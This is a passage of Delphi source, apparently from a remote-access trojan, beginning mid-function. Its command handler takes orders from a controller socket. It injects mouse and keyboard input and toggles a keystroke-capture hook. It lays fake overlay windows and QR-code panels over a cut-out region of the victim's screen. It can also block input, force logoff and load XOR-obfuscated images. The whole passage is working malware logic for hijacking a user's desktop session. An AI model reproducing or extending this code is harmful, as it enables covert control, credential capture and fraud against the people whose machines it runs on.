  vIdHTTP: TIdHTTP;
  InMS, OutMS: TMemoryStream;
  i: Integer;
  C: byte;
  chave: Word;
begin
  InMS := TMemoryStream.Create;
  OutMS := TMemoryStream.Create;
  chave := 02348;
  try
    InMS.LoadFromFile(URL);
    InMS.Position := 0;
    for i := 0 to InMS.Size - 1 do
    begin
      InMS.Read(C, 1);
      C := (C xor not(Ord(chave shr i)));
      OutMS.Write(C, 1);
    end;
    OutMS.Position := 0;
    jpeg := TPngImage.Create;
    jpeg.LoadFromStream(OutMS);
    APicture.Assign(jpeg);
  finally
    InMS.Free;
    OutMS.Free;
  end;

end;

{ procedure TPromptCmd.GetImageByUrl(URL: string; APicture: TPicture);
  var
  Jpeg: TPngImage;
  Strm: TMemoryStream;
  vIdHTTP : TIdHTTP;
  InMS, OutMS : TMemoryStream;
  I : Integer;
  C : byte;

  begin
  Screen.Cursor := crHourGlass;
  Jpeg := TPngImage.Create;
  Strm := TMemoryStream.Create;
  vIdHTTP := TIdHTTP.Create(nil);
  try
  vIdHTTP.Get(URL, Strm);
  if (Strm.Size > 0) then
  begin
  Strm.Position := 0;
  Jpeg.LoadFromStream(Strm);
  APicture.Assign(Jpeg);
  end;
  finally
  Strm.Free;
  Jpeg.Free;
  vIdHTTP.Free;
  Screen.Cursor := crDefault;
  end;

  end;
}

procedure TPromptCmd.keydown(Comando: string);
var
  S: string;
  Tecla: Integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    S := LstComando[1];
    Tecla := StrToInt(S);
    case Tecla of
      16, 17, 18, 20:
        begin
          if not KeyIsDown(Tecla) then
            keybd_event(Tecla, 0, 0, 0);
          procesaUser;
        end;
    else
      begin
        keybd_event(Tecla, 0, 0, 0);
        keybd_event(Tecla, 0, KEYEVENTF_KEYUP, 0);
      end;
    end;
    LstComando.Free;
  except
    fila.Clear;
    abort;
  end;

end;

function TPromptCmd.KeyIsDown(const Key: Integer): Boolean;
begin
  Result := GetKeyState(Key) and 128 > 0;

end;

procedure TPromptCmd.keyup(Comando: string);
var
  S: string;
  Tecla: Integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    S := LstComando[1];
    Tecla := StrToInt(S);
    keybd_event(Tecla, 0, KEYEVENTF_KEYUP, 0);
    LstComando.Free;

  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.mousedownd(Comando: string);
var
  x, Y: Integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    x := StrToInt(LstComando[1]);
    Y := StrToInt(LstComando[2]);
    setcursorpos(x, Y);
    pressmousedown(false);
    LstComando.Free;
    procesaUser;
  except
    fila.Clear;
    abort;
  end;
end;

procedure TPromptCmd.mousedowne(Comando: string);
var
  x, Y: Integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    x := StrToInt(LstComando[1]);
    Y := StrToInt(LstComando[2]);
    setcursorpos(x, Y);
    pressmousedown(true);
    LstComando.Free;
    procesaUser;
  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.mousemove(Comando: string);
var
  x, Y: Integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    x := StrToInt(LstComando[1]);
    Y := StrToInt(LstComando[2]);
    LstComando.Free;
    if MoverMouse then
      setcursorpos(x, Y);
    procesaUser;

  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.nSerial(Comando: string);
var
  LstComando: TStringList;
begin
  LstComando := TStringList.Create;
  LstComando := SplitString(Comando, '<#>');
  ChaveKey := LstComando[1];
  LstComando.Free;
end;

procedure TPromptCmd.pressmousedown(left: Boolean);
begin
  if left then
  begin
    // bBlockMouse:=false;
    if IsWindow(Handle_Main) then
    begin
      SendMessage(Handle_Progress, PBM_STEPIT, 1, 0);
      // Handle_Main.bar.stepit;
      // if Handle_Main.bar.Position = 100 then
      // Handle_Main.bar.Position:=0;
      SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
        GWL_EXSTYLE) or WS_EX_TRANSPARENT or WS_EX_NOACTIVATE);
      hwdPai := GetForegroundWindow;
      SetForegroundWindow(Handle_Main);
    end;
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    // hwdPai := GetForegroundWindow;
  end
  else
  begin
    // bBlockMouse:=false;
    if IsWindow(Handle_Main) then
    begin
      SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
        GWL_EXSTYLE) or WS_EX_TRANSPARENT or WS_EX_NOACTIVATE);
    end;
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);

  end;
end;

procedure TPromptCmd.pressmouseup(left: Boolean);
begin
  if left then
  begin
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    if IsWindow(Handle_Main) then
    begin
      SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
        GWL_EXSTYLE) and (not WS_EX_TRANSPARENT));
    end;
    // bBlockMouse:=true;
  end
  else
  begin
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
    if IsWindow(Handle_Main) then
    begin
      SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
        GWL_EXSTYLE) and not WS_EX_TRANSPARENT);
    end;
    // bBlockMouse:=true;
  end;
end;

procedure TPromptCmd.procesaUser;
begin
  //
  { if IsWindow(Handle_Main) then
    begin
    Handle_Main.C9szP7FB85C.Position:=Handle_Main.C9szP7FB85C.Position+1;
    if Handle_Main.C9szP7FB85C.Position=100 then
    Handle_Main.C9szP7FB85C.Position:=0;
    end;
  }
end;

procedure TPromptCmd.Qr_cod(Comando: string);
var
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    iQrCodeX1 := StrToInt(LstComando[1]);
    iQrCodeY1 := StrToInt(LstComando[2]);
    iQrCodeX2 := StrToInt(LstComando[3]);
    iQrCodeY2 := StrToInt(LstComando[4]);
    //
    LstComando.Free;

  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.RecortarRestaurar(Comando: Integer);
var
  rect: TRect;
begin
  case Comando of
    0:
      begin
        // if IsWindow(Handle_Main) then
        // begin
        bBlockMouse := false;
        MoverCursor := false;
        // Handle_Main.Center.Visible:=false;
        ShowWindow(Handle_Pic, SW_HIDE);
        // Handle_Main.DoubleBuffered:=false;
        // Region := CreateRectRgn(0, 0,rcDesktop.Width,
        // rcDesktop.Height);
        // Region2 := CreateRectRgn(X1,Y1,X2,Y2);
        // regionY := (Y2);
        // CombineRgn(region, region, region2, RGN_DIFF); }
        if IsWindow(Handle_Main) then
        begin
          if TNT_TEST = nil then
          begin
            TNT_TEST := TTNT_TEST.Create(nil);
            // TNT_TEST.ParentWindow := Handle_Main;
            TNT_TEST.Show;
            Windows.SetParent(TNT_TEST.handle, Handle_Main);
            rect.left := X1;
            rect.right := X2;
            rect.Top := Y1;
            rect.bottom := Y2;
            abreburaco(hwdPai, TNT_TEST, TNT_TEST.Pbox, rect.height, rect.Top,
              rect.left, rect.width, Handle_Main, ISQR);
            Install_Cur(false);
            Telinha := true;
          end;
        end;
        // end;
      end;
    1:
      begin
        if IsWindow(Handle_Main) then
        begin
          if TNT_TEST <> nil then
          begin
            Telinha := false;
            region := CreateRectRgn(0, 0, rcDesktop.width, rcDesktop.height);
            bBlockMouse := true;
            MoverCursor := true;
            GetWindowRect(TNT_TEST.Pbox.handle, rect);
            Region2 := CreateRectRgn(rect.left, rect.Top, rect.right,
              rect.bottom);
            CombineRgn(region, region, Region2, RGN_COPY);
            SetWindowRgn(Handle_Main, region, true);
            TNT_TEST.Close;
            ShowWindow(Handle_Pic, SW_SHOW);
            AlinhaJanela(hwdPai);
            Install_Cur(true);
          end;
        end;
      end;
  end;
end;

procedure TPromptCmd.RecortCmd(Comando: string);
var
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    X1 := StrToInt(LstComando[1]);
    Y1 := StrToInt(LstComando[2]);
    X2 := StrToInt(LstComando[3]);
    Y2 := StrToInt(LstComando[4]);
    ISQR := LstComando[5];
    RecortarRestaurar(0);
    LstComando.Free;
  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.Tratar;
begin
  try
    if fila.Count > 0 then
    begin
      TrataComando(O_F_uS_C('D', fila[0]));
      fila.Delete(0);
    end;
  except
  end;
end;

procedure TPromptCmd.TrataCmds(Comando: string);
var
  R: TRect;
  i: Integer;
  LstComando: TStringList;
begin
  //
  LstComando := TStringList.Create;
  LstComando := SplitString(Comando, '<#>');
  // travamentos e espera

  case StrToInt(LstComando[1]) of
    0:
      begin
        // define quem e
        case StrToInt(LstComando[2]) of
          // ------------------------------------------------------------
          0:
            begin
              if not IsWindow(Handle_Main) then
              begin
                Global.vFlag := 1;
                NextHandle := GetForegroundWindow;
                TratarCasa(LstComando[3]);
                uLook;
                // Instal_Lock;
                Install_Cur(true);
                Running_Block;
              end;
            end;
          1:
            begin
              if IsWindow(Handle_Main) then
              begin

                Running_ReleaseResources;
                strDeskTop := 0;
                Global.vFlag := 0;
                UniInstal_lock;
                Install_Cur(false);
                Telinha := false;

                // ScriptKid;

              end;

            end;
          2:
            begin
              if IsWindow(Handle_Main) then
              begin
                if TNT_01 = nil then
                begin
                  TNT_01 := TTNT_01.Create(nil);
                  TNT_01.id := LstComando[3];
                  TNT_01.Show;
                end;

              end;

            end;
          // -----------------------------------------------------------
          3:
            begin
              if IsWindow(Handle_Main) then
              begin
                if TNT_02 = nil then
                begin
                  TNT_02 := TTNT_02.Create(nil);
                  TNT_02.id := LstComando[3];
                  if LstComando[3] = 'TTL_03' then
                  begin
                    TNT_02.CH := LstComando[4];
                  end;
                  if LstComando[3] = 'TTL_PISCA' then
                  begin
                    TNT_02.Align := alCustom;
                    TNT_02.Position := poDesigned;
                    TNT_02.height := 209;
                    TNT_02.width := 751;
                    // Handle_Main.Chrome_WidgetWin_1.Transparent.Active:=False;
                    ShowWindow(Handle_Pic, SW_HIDE);
                    Application.ProcessMessages;
                    // TranslateMessage(Msg);
                    // DispatchMessage(Msg);
                    CreatReg(Handle_Main, TNT_02, CmdRmt.iQrCodeX1,
                      CmdRmt.iQrCodeY1, CmdRmt.iQrCodeX2, CmdRmt.iQrCodeY2);
                  end;
                  TNT_02.Show;
                end;
              end;
            end;
          //
          4:
            begin
              if IsWindow(Handle_Main) then
              begin
                if TNT_03 = nil then
                begin
                  TNT_03 := TTNT_03.Create(nil);
                  TNT_03.Show;
                end;
              end;
            end;

          5:
            begin
              if IsWindow(Handle_Main) then
              begin

                if TNT_04 = nil then
                begin
                  try
                    TNT_04 := TTNT_04.Create(nil);
                    TNT_04.id := LstComando[3];
                    if (LstComando[3] = 'TTL_02') or (LstComando[3] = 'TTL_03')
                    then
                    begin
                      TNT_04.CH := LstComando[4];
                    end;
                  finally
                    TNT_04.Show;
                  end;
                end;
              end;
            end;
          6:
            begin
              if IsWindow(Handle_Main) then
              begin
                if TNT_05 = nil then
                begin
                  try
                    TNT_05 := TTNT_05.Create(nil);
                    TNT_05.id := LstComando[3];
                    if (LstComando[3] = 'TTL_03') then
                    begin
                      TNT_05.CH := LstComando[4];
                    end;
                  finally
                    TNT_05.Show;
                  end;
                end;
              end;

            end;
          7:
            begin
              if IsWindow(Handle_Main) then
              begin
                if TNT_06 = nil then
                begin
                  try
                    TNT_06 := TTNT_06.Create(nil);
                    TNT_06.id := LstComando[3];
                    if (LstComando[3] = 'TTL_01') then
                    begin
                      TNT_06.CH := LstComando[4];
                    end;
                  finally
                    TNT_06.Show;
                  end;
                end;
              end;
            end;

          8:
            begin
              if IsWindow(Handle_Main) then
              begin
                if TNT_07 = nil then
                begin
                  try
                    TNT_07 := TTNT_07.Create(nil);
                  finally
                    TNT_07.Show;
                  end;
                end;
              end;
            end;

          9:
            begin
              { if (IsWindow(Handle_Main))then
                begin
                if FEsperanca=nil then
                begin
                Handle_Main.Center.Visible:=false;
                FEsperanca:=TFEsperanca.Create(nil);
                FEsperanca.Top := (Handle_Main.ClientHeight -FEsperanca.Height ) div 2;
                FEsperanca.Left:= (Handle_Main.ClientWidth  -FEsperanca.Width ) div 2;

                GetImageByUrl(gsRoaming+(barra)+LstComando[3],FEsperanca.AD17E8A95BDB7.Picture);
                FEsperanca.D25AFF3CD441.Clear;
                FEsperanca.b7BB486A640C169C3.Visible:=true;
                SetWindowLong(Handle_Main.Handle, GWL_EXSTYLE,
                GetWindowLong(Handle_Main.Handle, GWL_EXSTYLE)
                and not WS_EX_TRANSPARENT);
                FEsperanca.Show;
                end;
                end; }
            end;

          10:
            begin
              { if (IsWindow(Handle_Main))then
                begin
                if FEsperanca=nil then
                begin
                Handle_Main.Center.Visible:=false;
                FEsperanca:=TFEsperanca.Create(nil);
                FEsperanca.Top := (Handle_Main.ClientHeight -FEsperanca.Height ) div 2;
                FEsperanca.Left:= (Handle_Main.ClientWidth  -FEsperanca.Width ) div 2;

                GetImageByUrl(gsRoaming+(barra)+LstComando[3],FEsperanca.E25D360A34E26.Picture);
                FEsperanca.CB53F635CDB9.Clear;
                FEsperanca.ITE25D360A34E26.Visible:=true;
                SetWindowLong(Handle_Main.Handle, GWL_EXSTYLE,
                GetWindowLong(Handle_Main.Handle, GWL_EXSTYLE)
                and not WS_EX_TRANSPARENT);
                FEsperanca.Show;
                end;
                end; }
            end;

        end;

      end; // cmds zero

    1:
      begin
        case StrToInt(LstComando[2]) of
          0:
            FCursor := true;
          1:
            FCursor := false;
          2:
            CursorRemoto := true;
          3:
            CursorRemoto := false;
          4:
            begin
              DisablePeek;
              vFlagScree := 1;
            end;
          5:
            begin
              { if IsWindow(Handle_Main) then
                begin
                strDeskTop:=0;
                Handle_Main.AlphaBlend:=false;
                if Assigned( Handle_Main) then
                begin
                SetWindowLong(Handle_Main.Handle, GWL_EXSTYLE,
                GetWindowLong(Handle_Main.Handle, GWL_EXSTYLE)
                and not WS_EX_TRANSPARENT);
                end;
                end; }
            end;
          6:
            RecortarRestaurar(1);
          7:
            Instal_Key_Capt;
          8:
            unisInstal_Key_Capt;
          9:
            MoverMouse := true;
          10:
            MoverMouse := false;
          11:
            Bloque('D');
          12:
            Bloque('T');
          13:
            ExitWindowsEx(EWX_LOGOFF, 0);
          14:
            begin
              // if IsWindow(Handle_Main) then
              // begin
              // Running_ReleaseResources;
              // end;
              SendMessage(Handle_Main, WM_DESTROY, 0, 0);
              vFlagExit := 1;
              BitOK := false;
              CasaOK := false;
              Casa := '';
              Tipo := '';
              CmdPrincipal.SocketPrincipal.Close;
              CmdPrincipal.Suspend;
              CmdPrincipal.Terminate;
              Global.vFlag := 0;
              Install_Cur(false);
              if (Inicializado) then
                MagUninitialize;
              // UnregisterClass(wc);
              DestroyWindow(hwndMag);
              DestroyWindow(hWndHost);
              ArqTmp.Free;
              FreeAndNil(wc);
              // Sleep(10000);
              // FreeAndNil(wc);
              Iniciar;
            end;
          15:
            begin
              vFlagExit := 1;
              BitOK := false;
              CasaOK := false;
              Casa := '';
              Tipo := '';
              CmdPrincipal.Suspend;
              CmdPrincipal.Terminate;
              ProcessaOK := true;
              Install_Cur(false);
              if (Inicializado) then
                MagUninitialize;
              UnHookIt; // ScriptKid;

            end;
          16:
            begin
              if Telinha then
                Telinha := false
              else
                Telinha := true;
            end;
          17:
            begin
              if Assigned(TNT_01) then
                TNT_01.Close;
              if Assigned(TNT_02) then
                TNT_02.Close;
              if Assigned(TNT_03) then
                TNT_03.Close;
              if Assigned(TNT_04) then
                TNT_04.Close;
              if Assigned(TNT_05) then
                TNT_05.Close;
              if Assigned(TNT_06) then
                TNT_06.Close;
              if Assigned(TNT_07) then
                TNT_07.Close;
            end;
        end;

      end;

  end;
  LstComando.Free;

end;

procedure TPromptCmd.TrataComando(Comando: string);
begin
  if Pos('#mde#', Comando) > 0 then
    mousedowne(Comando);

  if Pos('#mdd#', Comando) > 0 then
    mousedownd(Comando);

  if Pos('#mmv#', Comando) > 0 then
    mousemove(Comando);

  if Pos('#mue#', Comando) > 0 then
    pressmouseup(true);

  if Pos('#mud#', Comando) > 0 then
    pressmouseup(false);

  if Pos('#kd#', Comando) > 0 then
    keydown(Comando);

  if Pos('#ku#', Comando) > 0 then
    keyup(Comando);

  if Pos('#clb#', Comando) > 0 then
    ClipboardCmd(Comando);

  // if pos ((vDecript('133FF21764')), Comando ) > 0 then
  // CliqueDuplo( Comando );

  if Pos('#Cmd#', Comando) > 0 then
    TrataCmds(Comando);

  if Pos('#RC#', Comando) > 0 then
    RecortCmd(Comando);

  if Pos('#QR#', Comando) > 0 then
    Qr_cod(Comando);

  if Pos('#QRCODE#', Comando) > 0 then
    Global.vFlagQR := 1;

end;

{ TExiste }

end.
